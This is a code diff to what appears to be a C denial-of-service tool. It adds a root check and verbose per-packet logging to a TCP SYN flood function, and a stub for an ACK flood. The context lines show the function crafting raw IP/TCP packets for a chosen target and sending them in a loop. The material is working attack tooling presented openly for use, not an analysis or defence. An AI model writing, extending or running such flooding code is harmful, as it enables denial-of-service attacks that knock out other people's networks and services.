@@ -3,6 +3,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdbool.h>
 #include <time.h>
 #include <unistd.h>
 #include <netinet/in.h>  /* For in_addr */
@@ -187,9 +188,14 @@ uint16_t checksum(uint16_t *addr, int len) {
 }
 
 void syn_flood(struct attack_opts_t *opts) {
-	
-	LOG_INFO("Starting TCP SYN Flood attack to %s for %d seconds", 
-			opts->atk_target, opts->atk_duration);
+
+	check_root();	
+	LOG_INFO("Started TCP SYN Flood attack to %s for %d seconds %s", 
+			opts->atk_target, opts->atk_duration, opt_verboose ? "(no replies will be shown)" : "");
+
+	printf(COLOR_YELLOW "▸ Target:" COLOR_RESET " %s\n", opts->atk_target);
+    	printf(COLOR_YELLOW "▸ Port:" COLOR_RESET " %s\n", opts->atk_port);
+    	printf(COLOR_YELLOW "▸ Duration:" COLOR_RESET " %d seconds\n\n", opts->atk_duration);
 
 	/* SYN Flood TCP header */
 	char buffer[PACKET_LEN];
@@ -222,6 +228,37 @@ void syn_flood(struct attack_opts_t *opts) {
 	        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
 
 		tcp->tcp_sum = calculate_tcp_checksum(ip);
+
+		if(opt_verboose) {
+			printf(COLOR_YELLOW "▸ Source IP:    " COLOR_BLUE "%-15s" COLOR_RESET, inet_ntoa(ip->iph_sourceip));
+    			printf(COLOR_YELLOW "  ▸ Source Port: " COLOR_BLUE "%d\n" COLOR_RESET, ntohs(tcp->tcp_sport));
+    
+    			printf(COLOR_YELLOW "▸ Dest IP:      " COLOR_BLUE "%-15s" COLOR_RESET, opts->atk_target);
+   			printf(COLOR_YELLOW "  ▸ Dest Port:   " COLOR_BLUE "%s\n" COLOR_RESET, opts->atk_port);
+    
+    			printf(COLOR_YELLOW "▸ Sequence:     " COLOR_BLUE "0x%08x" COLOR_RESET, ntohl(tcp->tcp_seq));
+    			printf(COLOR_YELLOW "  ▸ Window Size: " COLOR_BLUE "%d\n" COLOR_RESET, ntohs(tcp->tcp_win));
+    
+    			printf(COLOR_YELLOW "▸ IP Header:    " COLOR_BLUE "Version=%d" COLOR_RESET, ip->iph_ver);
+    			printf(COLOR_YELLOW ", IHL=%d" COLOR_RESET, ip->iph_ihl);
+    			printf(COLOR_YELLOW ", TTL=%d" COLOR_RESET, ip->iph_ttl);
+    			printf(COLOR_YELLOW ", Protocol=TCP (%d)\n" COLOR_RESET, ip->iph_protocol);
+    
+    			printf(COLOR_YELLOW "▸ TCP Flags:    " COLOR_RESET);
+    			printf(COLOR_BLUE "%s%s%s%s%s%s\n" COLOR_RESET,
+           			(tcp->tcp_flags & TH_SYN) ? "SYN " : "",
+           			(tcp->tcp_flags & TH_ACK) ? "ACK " : "",
+           			(tcp->tcp_flags & TH_FIN) ? "FIN " : "",
+           			(tcp->tcp_flags & TH_RST) ? "RST " : "",
+           			(tcp->tcp_flags & TH_PUSH) ? "PSH " : "",
+           			(tcp->tcp_flags & TH_URG) ? "URG " : "");
+    
+    			printf(COLOR_YELLOW "▸ Checksum:     " COLOR_BLUE "0x%04x" COLOR_RESET, ntohs(tcp->tcp_sum));
+    			printf(COLOR_YELLOW "  ▸ Packet Size: " COLOR_BLUE "%d bytes\n\n" COLOR_RESET, ntohs(ip->iph_len));
+    
+    			printf(COLOR_CYAN "[•] Packet #%-6lu " COLOR_YELLOW "Timestamp: " COLOR_BLUE "%.2fs\n" COLOR_RESET,
+					packets_count, difftime(time(NULL), start));
+		}
 		
 		/* send the packet out */
 		if (sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0) {
@@ -236,4 +273,6 @@ void syn_flood(struct attack_opts_t *opts) {
 	close(sock);
 }
 
-
+void ack_flood(struct attack_opts_t *opts) {
+	(void)opts;	
+}
